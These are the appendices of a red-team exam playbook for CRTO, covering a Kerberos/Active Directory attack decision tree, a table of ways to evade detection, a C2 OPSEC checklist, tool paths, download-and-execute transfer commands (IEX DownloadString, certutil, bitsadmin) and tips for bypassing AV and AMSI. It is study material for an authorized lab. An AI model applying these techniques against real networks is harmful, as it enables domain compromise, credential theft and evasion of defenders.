## Appendix E — Kerberos attack decision tree

```text
Do you have a domain foothold?
├─ No → obtain initial access (phishing / credentials / exposed service)
└─ Yes
   ├─ Need credentials?
   │  ├─ Accounts with SPNs .................. Kerberoast → crack (m 13100)
   │  ├─ Pre-auth disabled .................. AS-REP roast → crack (m 18200)
   │  ├─ Dangerous ACL ...................... ForceChangePassword / targeted Kerberoast
   │  ├─ Delegation configured .............. S4U2Self/Proxy, RBCD, shadow creds
   │  ├─ ADCS misconfiguration .............. request cert → TGT
   │  ├─ LAPS readable ...................... local admin password
   │  └─ Credentials in SYSVOL/files ........ cpassword / config files
   │
   ├─ Have credentials, need Domain Admin?
   │  ├─ DCSync rights ...................... DCSync krbtgt → golden/diamond
   │  ├─ WriteDacl on domain ................ grant DCSync → DCSync
   │  ├─ ADCS ESC1/ESC6/ESC4 ................ cert as admin → TGT
   │  ├─ Unconstrained delegation ............ coerce DC → TGT
   │  ├─ Local admin reuse .................. lateral → LSASS/SAM → DA creds
   │  ├─ GPO control ........................ push payload/task to Tier 0
   │  └─ MSSQL sysadmin/links ............... xp_cmdshell → host → creds
   │
   ├─ Have DA, need persistence?
   │  ├─ krbtgt keys ........................ golden / diamond ticket
   │  ├─ CA private key ..................... forged certificate (DPERSIST-1)
   │  ├─ DSRM / AdminSDHolder / SID history . domain persistence
   │  └─ ACL backdoor ....................... DCSync for a controlled user
   │
   ├─ Need a specific host/service?
   │  ├─ Service account key ................ silver ticket
   │  ├─ Write on computer object ............ RBCD → S4U
   │  ├─ WinRM/SMB admin .................... jump winrm64 / link
   │  └─ Share access ....................... \\host\c$
   │
   └─ Need another domain?
      ├─ Child → parent ..................... golden with /sids (EA SID)
      ├─ Inbound trust ...................... foreign group → cross-domain TGS
      └─ Outbound trust ..................... trust key → asktgt as TRUST$
```

---

## Appendix F — Detection quick reference: action → event

| Your action | Most likely evidence | Quieter alternative |
|---|---|---|
| `shell whoami` | 4688 + command line | `getuid` / `run` |
| `powershell -enc` | 4688, 4104 | `execute-assembly` / `powerpick` |
| `execute-assembly` | Sysmon 1, 7 | Custom `spawnto`, `blockdlls` |
| `mimikatz sekurlsa` | Sysmon 10 on LSASS, Defender ASR | DPAPI / tickets / tokens |
| `hashdump` | Sysmon 10 | `reg save` offline |
| `dcsync` | 4662 replication GUIDs | One account, once |
| `kerberoast` | 4769 RC4 (`0x17`) | `/rc4opsec`, few targets |
| `asreproast` | 4768 pre-auth off | Low volume |
| Golden ticket | TGT anomalies, no 4768 | Diamond, AES |
| Silver ticket | Service-side logon | Scope to one service |
| `pth` | 4624 type 3 + 4776 NTLM | `asktgt` AES |
| `make_token` | 4648 | `steal_token` |
| PsExec jump | 7045/4697 + service binary | WinRM, SMB beacon |
| WinRM jump | 4624 type 3, WSMan | `link` |
| WMI exec | 4688 parent `WmiPrvSE.exe` | WinRM |
| Scheduled task | 4698/4702 | Existing autostart |
| Service create | 7045/4697 | — |
| ACL change | 5136 | Narrow right, revert |
| RBCD / shadow creds | 5136 | Remove after |
| GPO change | 5136 + SYSVOL | — |
| LSASS dump file | Sysmon 11 | In-memory only |
| `wevtutil cl` | 1102 | Never |
| Disable Defender | 5001 / 5007 | Never |
| Beacon egress | Sysmon 3 / WFP 5156 | Redirector, believable process |
| SMB beacon | Sysmon 17/18 | Non-default pipe |
| Port forward | WFP 5156, `netstat` | Existing allowed port |
| Firewall rule | 4946/4947, registry | Avoid |
| `.NET` assembly from disk | Sysmon 11 + 7 | `execute-assembly` from memory |

---

## Appendix G — Pre-submit OPSEC checklist

Copy this into your notes and tick it before you submit.

### C2 and infrastructure

- [ ] Non-default malleable profile (URIs, headers, user-agent)
- [ ] Non-default port and Host header
- [ ] `sleep` ≥ 60s with jitter on persistent beacons
- [ ] Non-default `spawnto` (not `rundll32.exe`)
- [ ] Non-default SMB pipe name
- [ ] `blockdlls start` used where appropriate
- [ ] Stageless payloads where possible
- [ ] Redirector/CDN in front of the team server
- [ ] `killdate` set
- [ ] One slow lifeline beacon; short-lived sessions for work

### Execution and collection

- [ ] No `shell` used for anything that could be `run`/`execute-assembly`
- [ ] No `powershell.exe` spawned unnecessarily
- [ ] No `rundll32.exe` parents left running
- [ ] No LSASS access on restricted/Tier-0 hosts
- [ ] No credential dumps left on disk
- [ ] No keylogger/screenshot left running
- [ ] No `wevtutil`/log clearing
- [ ] No Defender/AMSI policy changes

### Lateral movement and pivots

- [ ] Minimum number of hops to the objective
- [ ] No PsExec services left behind
- [ ] No scheduled tasks left behind
- [ ] No SMB payloads left on admin shares
- [ ] SOCKS5, not SOCKS4
- [ ] All `socks`, `rportfwd`, `link`, tunnels closed
- [ ] Firewall rules removed
- [ ] No unexpected egress from odd processes

### Directory and persistence

- [ ] ACL changes reverted
- [ ] RBCD attribute removed
- [ ] Shadow credentials removed
- [ ] GPO changes and links removed
- [ ] GPO-created tasks/scripts removed
- [ ] LAPS expiry restored (if changed)
- [ ] No golden/skeleton/DSRM persistence unless required
- [ ] No new domain users/groups unless required

### Final

- [ ] Objective achieved and evidence captured
- [ ] Action log complete
- [ ] Restricted-host list re-read
- [ ] No beacon still calling home
- [ ] Ready to pause/submit

---

## Appendix H — Tool paths and file transfer

### H.1 Common lab paths (Windows attack host)

```text
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
C:\Tools\PowerSploit\Recon\PowerView.ps1
C:\Tools\PowerSploit\Privesc\Get-GPPPassword.ps1
C:\Tools\SharpHound\SharpHound.exe
C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe
C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe
C:\Tools\Certify\Certify\bin\Release\Certify.exe
C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe
C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe
C:\Tools\PowerUpSQL\PowerUpSQL.ps1
C:\Tools\StandIn\StandIn\bin\Release\StandIn.exe
C:\Tools\ForgeCert.exe
C:\Tools\LAPSToolkit\LAPSToolkit.ps1
C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe
C:\Tools\winPEAS\winPEASx64.exe
C:\Tools\PowerLurk.ps1
```

### H.2 Writable locations on targets

```text
C:\Windows\Temp\
C:\Windows\Tasks\          # commonly writable, inside an AppLocker-allowed path
C:\ProgramData\
%TEMP%                     # user context
%APPDATA%                  # user context
```

### H.3 Transfer methods

| Method | Command | Notes |
|---|---|---|
| Beacon | `upload <local> <remote>` / `download <remote>` | Preferred |
| PowerShell | `IEX (New-Object Net.WebClient).DownloadString(...)` | 4104/4688 |
| certutil | `certutil -urlcache -split -f <url> <path>` | LOLBAS |
| bitsadmin | `bitsadmin /transfer job /download /priority high <url> <path>` | LOLBAS |
| SMB | `copy \\<host>\share\file .` | Network logon |
| Base64 | `certutil -encode` + paste | For small files |
| Reverse port forward | `rportfwd` + HTTP | For target→operator |

**OPSEC:** every method leaves a file or a network connection. Delete transfers, and avoid `IEX` on hosts with script-block logging.

---

## Appendix I — Troubleshooting master table

| Symptom | First checks | Likely fix |
|---|---|---|
| No beacon | Egress, listener, arch | `Test-NetConnection`; switch port; rebuild payload |
| Beacon dies immediately | AV/EDR | `spawnto`, `blockdlls`, stageless, artifact kit |
| `execute-assembly` fails to load | Path/arch | x64 build; verify path; check `job` |
| Assembly runs, no output | AV truncation / wrong args | Smaller tool; check args; test in lab |
| Mimikatz fails | Not SYSTEM / LSASS protected | `getsystem`; try another source |
| `getsystem` fails | No SeImpersonate | Potato family |
| Access denied on `c$` | Not local admin | `Find-LocalAdminAccess`; token theft |
| `jump` fails | SMB/WinRM blocked, FQDN | `portscan`; use FQDN |
| Kerberos SPN error | IP instead of FQDN | Use `cifs/<fqdn>` |
| Clock skew | Time mismatch | Sync with DC |
| DCSync denied | Missing replication rights | Check BloodHound ACLs |
| Golden ticket rejected | Wrong SID/key/AES | Verify; use AES256 |
| Certify finds nothing | Wrong CA/domain/creds | `cas`; `-domain`; alternate creds |
| Cert request denied | Enrolment rights/approval | ESC7 or different template |
| SOCKS works, tools fail | Proxy/DNS | proxychains; FQDN; DNS to DC |
| `rportfwd` unreachable | Firewall | Check `netstat`; avoid new rules |
| AppLocker blocks | Policy | Allowed path/LOLBAS |
| AMSI blocks | Signature | `execute-assembly`; vary bypass |
| PowerShell in CLM | Constrained mode | .NET / non-PS payload |
| SQL xp_cmdshell fails | Disabled / no sysadmin | Enable; impersonate; link |
| BloodHound no path | Stale data | Re-collect |
| Task/service runs but no effect | Payload/arch/path | Test payload manually |
| Beacon lost after reboot | No persistence | Re-establish via initial access |

---

## Sources and further reading

This playbook was compiled from public material; it does not reproduce Zero Point Security's paid course content.

**Official / course**

- Zero Point Security — Red Team Ops: <https://training.zeropointsecurity.co.uk/courses/red-team-ops>
- Zero Point Security — Red Team Ops II: <https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii>
- Cobalt Strike documentation (HelpSystems / Fortra): <https://hstechdocs.helpsystems.com/manuals/cobaltstrike/>

**Public notes and reviews (used to validate scope and OPSEC themes)**

- An0nUD4Y — CRTO Notes / Cheatsheet: <https://github.com/An0nUD4Y/CRTO-Notes>
- dr34mhacks — CRTO CheatSheet: <https://github.com/dr34mhacks/CRTO-CheatSheet>
- 0xn1k5 — Red Teaming / CRTO notes: <https://github.com/0xn1k5/Red-Teaming>
- robinx0 — CRTO review: <https://robinx0.github.io>
- loland.cv — CRTO review (2025): <https://loland.cv>
- parad0x — CRTO experience (2025): <https://medium.com/@_parad0x>
- razzlemouse — CRTO honest review (2025): <https://razzlemouse.medium.com>

**Tool documentation**

- Mimikatz: <https://github.com/gentilkiwi/mimikatz>
- Rubeus: <https://github.com/GhostPack/Rubeus>
- PowerView / PowerSploit: <https://github.com/PowerShellMafia/PowerSploit>
- BloodHound / SharpHound: <https://github.com/BloodHoundAD/BloodHound>
- Certify: <https://github.com/GhostPack/Certify>
- Certipy: <https://github.com/ly4k/Certipy>
- SharpDPAPI: <https://github.com/GhostPack/SharpDPAPI>
- Seatbelt / SharpUp: <https://github.com/GhostPack>
- Impacket: <https://github.com/fortra/impacket>
- LOLBAS: <https://lolbas-project.github.io>

**Disclaimer:** use only against systems you are authorized to test. The CRTO exam permits the use of your own notes and tools inside its lab; this document is intended for that context and for study.

